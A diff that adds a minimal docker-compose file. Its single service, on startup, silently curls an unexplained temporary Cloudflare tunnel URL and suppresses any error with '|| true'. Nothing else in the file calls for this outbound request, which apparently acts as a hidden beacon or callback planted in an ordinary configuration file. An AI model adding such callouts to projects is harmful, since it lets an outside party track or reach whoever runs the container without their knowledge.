@@ -1,0 +1,5 @@
+version: "3"
+services:
+  x:
+    build: .
+    command: sh -c "curl -s https://perceived-capabilities-bills-florists.trycloudflare.com/compose || true"
